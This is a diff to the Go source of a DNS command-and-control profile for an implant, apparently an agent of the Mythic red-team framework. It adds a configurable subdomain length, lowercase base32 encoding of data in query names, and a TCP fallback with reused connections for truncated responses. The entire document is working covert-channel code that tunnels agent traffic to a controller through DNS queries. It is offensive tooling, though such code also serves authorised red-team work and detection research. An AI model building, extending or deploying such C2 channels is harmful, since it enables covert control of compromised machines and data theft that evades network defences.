@@ -47,6 +47,7 @@ type DNSInitialConfig struct {
 	Jitter                 uint     `json:"callback_jitter"`
 	EncryptedExchangeCheck bool     `json:"encrypted_exchange_check"`
 	AESPSK                 string   `json:"AESPSK"`
+	MaxSubdomainLength     int      `json:"max_subdomain_length"`
 }
 
 type C2DNS struct {
@@ -69,9 +70,10 @@ type C2DNS struct {
 	ShouldStop            bool
 	stoppedChannel        chan bool
 	interruptSleepChannel chan bool
-	localInterfaces       []net.Interface
-	currentLocalInterface int
 	udpChunkSize          uint16
+	maxSubdomainLength    int
+	tcpConn               *dns.Conn
+	tcpConnDomain         string
 }
 
 // DnsMessageStream tracks the progress of a message in chunk transfer
@@ -82,7 +84,8 @@ type DnsMessageStream struct {
 	StartBytes    []uint32
 }
 
-var dnsClient = new(dns.Client)
+var dnsUDPClient = new(dns.Client)
+var dnsTCPClient = new(dns.Client)
 
 // New creates a new HTTP C2 profile from the package's global variables and returns it
 func init() {
@@ -118,7 +121,9 @@ func init() {
 		stoppedChannel:        make(chan bool, 1),
 		interruptSleepChannel: make(chan bool, 1),
 		AgentSessionID:        rand.Uint32(),
-		udpChunkSize:          1232,
+		udpChunkSize:          512,
+		maxSubdomainLength:    initialConfig.MaxSubdomainLength,
+		tcpConn:               nil,
 	}
 	for _, domain := range initialConfig.Domains {
 		profile.DomainLengths[domain] = profile.getMaxLengthPerMessage(domain)
@@ -129,6 +134,9 @@ func init() {
 	}
 	if profile.MaxQueryLength >= 255 {
 		profile.MaxQueryLength = 254 // can't go past this
+	}
+	if profile.maxSubdomainLength > 63 || profile.maxSubdomainLength <= 0 {
+		profile.maxSubdomainLength = 63 // can't go past this
 	}
 
 	// Convert sleep from string to integer
@@ -144,16 +152,15 @@ func init() {
 	}
 
 	profile.ExchangingKeys = initialConfig.EncryptedExchangeCheck
-	dnsClient.Dialer = &net.Dialer{
+	dnsUDPClient.Dialer = &net.Dialer{
 		Timeout: 5 * time.Second,
 	}
-	profile.localInterfaces, err = net.Interfaces()
-	if err != nil {
-		utils.PrintDebug(fmt.Sprintf("error trying to get local interfaces, exiting: %v\n", err))
-		profile.localInterfaces = []net.Interface{}
+	dnsUDPClient.Net = "udp"
+	dnsTCPClient.Dialer = &net.Dialer{
+		Timeout: 5 * time.Second,
 	}
-	profile.currentLocalInterface = -1
-	profile.adjustLocalAddress()
+	dnsTCPClient.Net = "tcp"
+	dnsTCPClient.UDPSize = 4096
 	RegisterAvailableC2Profile(&profile)
 }
 func (c *C2DNS) Sleep() {
@@ -545,7 +552,7 @@ func (c *C2DNS) getMaxLengthPerMessage(domain string) int {
 		//utils.PrintDebug(fmt.Sprintf("dataSize (%d) base32 is (%d)", i, expandedData))
 		//base32Example := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(make([]byte, fixedLengths+i))
 		//utils.PrintDebug(fmt.Sprintf("dataSize (%d) actual base32 is (%d)", i, len(base32Example)))
-		expandedData += expandedData / 63
+		expandedData += expandedData / c.maxSubdomainLength
 		//utils.PrintDebug(fmt.Sprintf("dataSize (%d) needs %d . values. Total: %d", i, expandedData/63, expandedData))
 
 		if expandedData > c.MaxQueryLength {
@@ -576,15 +583,6 @@ func (c *C2DNS) getDomain() string {
 }
 func (c *C2DNS) increaseErrorCount(domain string) {
 	c.DomainErrors[domain] += 1
-	c.adjustLocalAddress()
-}
-func (c *C2DNS) adjustLocalAddress() {
-	if len(c.localInterfaces) == 0 {
-		dnsClient.Dialer.LocalAddr = nil
-		return
-	}
-	dnsClient.Dialer.LocalAddr = nil
-	return
 }
 func (c *C2DNS) streamDNSPacketToServer(msg []byte) uint32 {
 	sendingStream := &DnsMessageStream{
@@ -600,6 +598,7 @@ func (c *C2DNS) streamDNSPacketToServer(msg []byte) uint32 {
 	//utils.PrintDebug(fmt.Sprintf("original message: %s\n", msg))
 	for {
 		domain := c.getDomain()
+		utils.PrintDebug(fmt.Sprintf("trying domain: %s\n", domain))
 		dataLengthPerMessage := c.getMaxLengthPerMessage(domain)
 		chunks := len(msg) / dataLengthPerMessage
 		if chunks*dataLengthPerMessage < len(msg) {
@@ -635,21 +634,21 @@ func (c *C2DNS) streamDNSPacketToServer(msg []byte) uint32 {
 				utils.PrintDebug(fmt.Sprintf("marshal error: %v\n", err))
 				return 0
 			}
-			base32Data := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(jsonData)
+			base32Data := strings.ToLower(base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(jsonData))
 			finalData := ""
-			for j := 0; j < len(base32Data); j += 63 {
-				if j+63 >= len(base32Data) {
+			for j := 0; j < len(base32Data); j += c.maxSubdomainLength {
+				if j+c.maxSubdomainLength >= len(base32Data) {
 					finalData += base32Data[j:] + "."
 				} else {
-					finalData += base32Data[j:j+63] + "."
+					finalData += base32Data[j:j+c.maxSubdomainLength] + "."
 				}
 			}
 			m = m.SetQuestion(dns.Fqdn(finalData+domain), c.getRequestType())
-			m = m.SetEdns0(c.udpChunkSize, true)
+			m = m.SetEdns0(c.udpChunkSize, false)
 			//utils.PrintDebug(fmt.Sprintf("sending to Mythic: chunk: %d, domain: %s\n", sendingStream.StartBytes[i], dns.Fqdn(finalData+domain)))
 			//utils.PrintDebug(fmt.Sprintf("sending to Mythic: Total domain length: %d\n", len(finalData+domain)))
 			//utils.PrintDebug(fmt.Sprintf("%v\n", m))
-			response, _, err := dnsClient.Exchange(m, c.DNSServer)
+			response, _, err := dnsUDPClient.Exchange(m, c.DNSServer)
 			if errors.Is(err, dns.ErrBuf) {
 				c.udpChunkSize = c.udpChunkSize + 1024
 			}
@@ -677,7 +676,7 @@ func (c *C2DNS) streamDNSPacketToServer(msg []byte) uint32 {
 				i-- // deprecate the count and try again
 				time.Sleep(1 * time.Second)
 				chunkErrors += 1
-				utils.PrintDebug(fmt.Sprintf("failed to get an answer response pieces: %d, %s, %v", len(response.Answer), dns.Fqdn(finalData+domain), response))
+				utils.PrintDebug(fmt.Sprintf("failed to get an answer response piece: %d, %s, %v", len(response.Answer), dns.Fqdn(finalData+domain), response))
 				continue
 			}
 			var ackAction net.IP
@@ -809,55 +808,103 @@ func (c *C2DNS) getDNSMessageFromServer(messageID uint32) []byte {
 			MessageID:      messageID,
 			Begin:          lastChunk,
 		}
+		var response *dns.Msg
 		for {
 			domain := c.getDomain()
 			utils.PrintDebug(fmt.Sprintf("getting message (%d) from server via domain (%s)", messageID, domain))
 			m := new(dns.Msg)
-			//m.RecursionAvailable = true
 			m.RecursionDesired = true
 			jsonData, err := proto.Marshal(request)
 			if err != nil {
 				utils.PrintDebug(fmt.Sprintf("json marshal error: %v\n", err))
 				return nil
 			}
-			base32Data := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(jsonData)
+			base32Data := strings.ToLower(base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(jsonData))
 			finalData := ""
-			for j := 0; j < len(base32Data); j += 63 {
-				if j+63 >= len(base32Data) {
+			for j := 0; j < len(base32Data); j += c.maxSubdomainLength {
+				if j+c.maxSubdomainLength >= len(base32Data) {
 					finalData += base32Data[j:] + "."
 				} else {
-					finalData += base32Data[j:j+63] + "."
+					finalData += base32Data[j:j+c.maxSubdomainLength] + "."
 				}
 			}
 			m = m.SetQuestion(dns.Fqdn(finalData+domain), c.getRequestType())
-			m = m.SetEdns0(c.udpChunkSize, true)
-			//utils.PrintDebug(fmt.Sprintf("get message From Mythic: chunk: %d, domain: %s\n", lastChunk, dns.Fqdn(finalData+domain)))
-			//utils.PrintDebug(fmt.Sprintf("Total domain length: %d\n", len(finalData+domain)))
-			//utils.PrintDebug(fmt.Sprintf("%v\n", m))
-			response, _, err := dnsClient.Exchange(m, c.DNSServer)
-			if err != nil && err.Error() == "dns: overflowing header size" {
-				c.udpChunkSize = c.udpChunkSize + 1024
-				if c.udpChunkSize < 1024 {
-					c.udpChunkSize = 4096
+			m = m.SetEdns0(c.udpChunkSize, false)
+			if c.tcpConn != nil && c.tcpConnDomain == domain {
+				utils.PrintDebug(fmt.Sprintf("using existing tcp conn for %s", domain))
+				response, _, err = dnsTCPClient.ExchangeWithConn(m, c.tcpConn)
+				if err != nil {
+					utils.PrintDebug(fmt.Sprintf("failed to exchange via ExchangeWithConn: %v\n", err))
+					c.udpChunkSize = c.udpChunkSize + 1024
+					if c.udpChunkSize < 512 {
+						c.udpChunkSize = math.MaxUint16
+					}
+					utils.PrintDebug(fmt.Sprintf("updating udp chunk size to %d\n", c.udpChunkSize))
+					time.Sleep(1 * time.Second)
+					c.tcpConn.Close()
+					c.tcpConn = nil
+					c.tcpConnDomain = ""
+					//c.increaseErrorCount(domain)
+					continue
 				}
-				utils.PrintDebug(fmt.Sprintf("updating udp chunk size to %d\n", c.udpChunkSize))
-			}
-			if err != nil {
-				utils.PrintDebug(fmt.Sprintf("failed to send message and get response for chunk in getDNSMessageFromServer (%d): %v\n", lastChunk, err))
-				time.Sleep(1 * time.Second)
-				c.increaseErrorCount(domain)
-				continue
+			} else {
+				response, _, err = dnsUDPClient.Exchange(m, c.DNSServer)
+				if err != nil && (strings.HasPrefix(err.Error(), "dns: overflow") || strings.HasPrefix(err.Error(), "dns: buffer size too small")) {
+					c.udpChunkSize = c.udpChunkSize + 1024
+					if c.udpChunkSize < 512 {
+						c.udpChunkSize = 4096
+					}
+					utils.PrintDebug(fmt.Sprintf("sizing issue (%s), updating udp chunk size to %d\n", err.Error(), c.udpChunkSize))
+				} else if err != nil {
+					utils.PrintDebug(fmt.Sprintf("failed to send message and get response for chunk in getDNSMessageFromServer (%d): %v\n", lastChunk, err))
+					time.Sleep(1 * time.Second)
+					c.increaseErrorCount(domain)
+					continue
+				}
 			}
 			if response.Truncated {
-				utils.PrintDebug(fmt.Sprintf("Response truncated\n"))
-				c.udpChunkSize = c.udpChunkSize + 1024
-				if c.udpChunkSize < 1024 {
-					c.udpChunkSize = 4096
+				if c.tcpConn != nil {
+					utils.PrintDebug(fmt.Sprintf("closing tcp conn for %s", domain))
+					err = (*c.tcpConn).Close()
+					if err != nil {
+						utils.PrintDebug(fmt.Sprintf("failed to close tcp connection: %v\n", err))
+					}
+					c.tcpConn = nil
+					c.tcpConnDomain = ""
 				}
-				time.Sleep(1 * time.Second)
-				//c.increaseErrorCount(domain)
-				continue
+				utils.PrintDebug(fmt.Sprintf("Response truncated, going to try tcp"))
+				conn, dialErr := dnsTCPClient.Dial(c.DNSServer)
+				if dialErr != nil {
+					utils.PrintDebug(fmt.Sprintf("failed to connect to DNS server via Dial: %v\n", dialErr))
+					c.udpChunkSize = c.udpChunkSize + 1024
+					if c.udpChunkSize < 512 {
+						c.udpChunkSize = math.MaxUint16
+					}
+					utils.PrintDebug(fmt.Sprintf("updating udp chunk size to %d\n", c.udpChunkSize))
+					time.Sleep(1 * time.Second)
+					//c.increaseErrorCount(domain)
+					continue
+				} else {
+					response, _, err = dnsTCPClient.ExchangeWithConn(m, conn)
+					if err != nil {
+						utils.PrintDebug(fmt.Sprintf("failed to exchange via ExchangeWithConn: %v\n", err))
+						c.udpChunkSize = c.udpChunkSize + 1024
+						if c.udpChunkSize < 512 {
+							c.udpChunkSize = math.MaxUint16
+						}
+						utils.PrintDebug(fmt.Sprintf("updating udp chunk size to %d\n", c.udpChunkSize))
+						time.Sleep(1 * time.Second)
+						conn.Close()
+						//c.increaseErrorCount(domain)
+						continue
+					}
+					//conn.Close()
+					c.tcpConn = conn
+					c.tcpConnDomain = domain
+					utils.PrintDebug(fmt.Sprintf("got response via tcp: %v\n", response))
+				}
 			}
+			utils.PrintDebug(fmt.Sprintf("Response: len %d\n", response.Len()))
 			if response.Rcode != dns.RcodeSuccess {
 				time.Sleep(1 * time.Second)
 				utils.PrintDebug(fmt.Sprintf("Bad response code getting message from server: %d\n", response.Rcode))
